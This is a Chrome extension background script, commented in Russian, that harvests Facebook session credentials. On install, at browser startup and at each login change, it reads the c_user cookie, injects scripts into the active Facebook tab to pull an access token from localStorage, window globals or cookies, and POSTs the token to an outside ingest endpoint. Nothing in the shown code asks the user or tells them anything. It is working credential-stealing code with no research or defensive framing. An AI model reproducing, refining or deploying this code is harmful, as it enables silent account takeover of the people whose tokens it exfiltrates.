// extension/background.js
//
// Service worker (Manifest V3). Живёт по событию, не на странице.
//
// Две обязанности:
//   1) Слушать c_user cookie (FB user id) и при смене пытаться выудить access_token
//      из активной FB-вкладки, потом POSTить на endpoint.
//   2) Хранить endpoint URL и last-sent мету в chrome.storage.local.
//
// Код минимальный, без зависимостей. Идемпотентность по 60s на fb_user_id живёт
// в памяти сервис-воркера (при рестарте SW сбросится — это ок, даёт второй шанс
// через 60s, а не нулевую защиту).

const DEFAULT_ENDPOINT = "https://obelista-preview.vercel.app/api/extension/ingest"
const STATE_ENDPOINT_SUFFIX = "/state" // для опций: из /api/extension/ingest уже вырезали /ingest выше
const TOKEN_DEBOUNCE_MS = 60_000

const recentTokenSends = new Map() // fb_user_id -> timestamp ms

// ---------- storage helpers ----------

async function getEndpoint() {
  const { endpoint } = await chrome.storage.local.get("endpoint")
  return endpoint || DEFAULT_ENDPOINT
}

async function setEndpoint(url) {
  await chrome.storage.local.set({ endpoint: url })
}

// ---------- fb_user_id из c_user ----------

async function getFbUserId() {
  try {
    const c = await chrome.cookies.get({ name: "c_user", domain: ".facebook.com" })
    if (c && c.value && /^\d{5,}$/.test(c.value)) return c.value
  } catch (e) {
    console.error("[obelista] cookies.get c_user failed", e)
  }
  return null
}

// ---------- access_token: 3 стратегии ----------

async function tryTabExecute(tabId, fn) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId },
      func: fn,
    })
    if (Array.isArray(results) && results[0] && results[0].result !== undefined) {
      return results[0].result
    }
  } catch (e) {
    // tabs.executeScript на chrome:// или chromewebstore бросает — это ожидаемо
    console.error("[obelista] executeScript failed", e)
  }
  return null
}

const FN_LOCALSTORAGE = () => {
  try { return localStorage.getItem("access_token") } catch { return null }
}

const FN_WINDOW = () => {
  try {
    if (window.__accessToken) return window.__accessToken
    if (window.__userToken) return window.__userToken
  } catch {}
  return null
}

async function getAccessToken() {
  // 1) localStorage на активной FB-вкладке
  const tabs = await chrome.tabs.query({ url: ["https://*.facebook.com/*"] })
  for (const t of tabs) {
    if (!t.id || !t.active) continue
    let tok = await tryTabExecute(t.id, FN_LOCALSTORAGE)
    if (tok) return { token: tok, source: "localStorage" }
    tok = await tryTabExecute(t.id, FN_WINDOW)
    if (tok) return { token: tok, source: "graphql" }
  }
  // 2) cookie fallback
  try {
    const c = await chrome.cookies.get({ name: "access_token", domain: ".facebook.com" })
    if (c && c.value) return { token: c.value, source: "cookie" }
  } catch (e) {
    console.error("[obelista] cookies.get access_token failed", e)
  }
  return null
}

// ---------- POST ----------

async function postIngest(body) {
  const endpoint = await getEndpoint()
  try {
    const r = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      cache: "no-store",
    })
    const text = await r.text()
    let parsed
    try { parsed = JSON.parse(text) } catch { parsed = { raw: text } }
    return { ok: r.ok, status: r.status, body: parsed }
  } catch (e) {
    console.error("[obelista] POST failed", e)
    return { ok: false, status: 0, body: { error: String(e) } }
  }
}

// ---------- token harvest flow ----------

async function harvestToken(reason) {
  const fb_user_id = await getFbUserId()
  if (!fb_user_id) {
    console.log("[obelista] no c_user cookie, skip")
    return
  }
  const lastSent = recentTokenSends.get(fb_user_id) ?? 0
  if (Date.now() - lastSent < TOKEN_DEBOUNCE_MS) {
    console.log(`[obelista] token debounce for user ${fb_user_id} (${reason})`)
    return
  }
  const got = await getAccessToken()
  if (!got) {
    console.log(`[obelista] no access_token found (${reason})`)
    return
  }
  const result = await postIngest({
    type: "token",
    captured_at: new Date().toISOString(),
    fb_user_id,
    payload: { access_token: got.token, source: got.source },
  })
  if (result.ok) {
    recentTokenSends.set(fb_user_id, Date.now())
    await chrome.storage.local.set({
      lastResult: { ok: true, at: Date.now(), type: "token", status: result.status },
    })
    console.log(`[obelista] token sent for ${fb_user_id} (${got.source})`)
  } else {
    await chrome.storage.local.set({
      lastResult: { ok: false, at: Date.now(), type: "token", status: result.status, error: result.body?.error },
    })
    console.error(`[obelista] token POST failed: ${result.status}`, result.body)
  }
}

// ---------- события ----------

chrome.cookies.onChanged.addListener((change) => {
  const c = change.cookie
  if (!c) return
  if (c.name !== "c_user") return
  if (!/(\.|^)facebook\.com$/.test(c.domain)) return
  if (change.cause === "overwrite" || change.cause === "explicit") {
    // user залогинился / сменился аккаунт — пробуем дёрнуть токен
    harvestToken(`cookie:${change.cause}`)
  }
})

// Юзер мог сидеть залогиненным в FB ДО установки расширения — тогда
// chrome.cookies.onChanged не выстрелит, потому что куки не меняются.
// На install и на старте браузера сами дёргаем harvest. 60s debounce в
// harvestToken защитит от двойной отправки.
chrome.runtime.onInstalled.addListener(() => {
  console.log("[obelista] installed")
  harvestToken("install").catch((e) => console.error("[obelista] install harvest failed", e))
})

chrome.runtime.onStartup.addListener(() => {
  console.log("[obelista] startup")
  harvestToken("startup").catch((e) => console.error("[obelista] startup harvest failed", e))
})

// ---------- messages from content/popup/options ----------

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  (async () => {
    try {
      if (msg?.type === "harvest_now") {
        await harvestToken("manual")
        sendResponse({ ok: true })
        return
      }
      if (msg?.type === "get_status") {
        const { endpoint, lastResult } = await chrome.storage.local.get(["endpoint", "lastResult"])
        sendResponse({ endpoint: endpoint || DEFAULT_ENDPOINT, lastResult: lastResult ?? null })
        return
      }
      if (msg?.type === "send_test_drop") {
        const r = await postIngest({
          type: "token",
          captured_at: new Date().toISOString(),
          fb_user_id: "test",
          payload: { access_token: "test", source: "localStorage" },
        })
        sendResponse(r)
        return
      }
      if (msg?.type === "test_connection") {
        const endpoint = (await getEndpoint()).replace(/\/ingest\/?$/, "")
        const url = `${endpoint}${STATE_ENDPOINT_SUFFIX}`
        try {
          const r = await fetch(url, { method: "GET", cache: "no-store" })
          const body = await r.json().catch(() => null)
          sendResponse({ ok: r.ok, status: r.status, body, url })
        } catch (e) {
          sendResponse({ ok: false, status: 0, error: String(e), url })
        }
        return
      }
      if (msg?.type === "get_state") {
        // Попап хочет живое состояние с бэка (что опции показывают по
        // "Test connection"). Идём тем же путём что и test_connection,
        // только возвращаем body без обёртки.
        const endpoint = (await getEndpoint()).replace(/\/ingest\/?$/, "")
        const url = `${endpoint}${STATE_ENDPOINT_SUFFIX}`
        try {
          const r = await fetch(url, { method: "GET", cache: "no-store" })
          const body = await r.json().catch(() => null)
          sendResponse({ ok: r.ok, status: r.status, body, url })
        } catch (e) {
          sendResponse({ ok: false, status: 0, error: String(e), url })
        }
        return
      }
      sendResponse({ ok: false, error: "unknown message" })
    } catch (e) {
      console.error("[obelista] message handler error", e)
      sendResponse({ ok: false, error: String(e) })
    }
  })()
  return true // keep channel open for async sendResponse
})
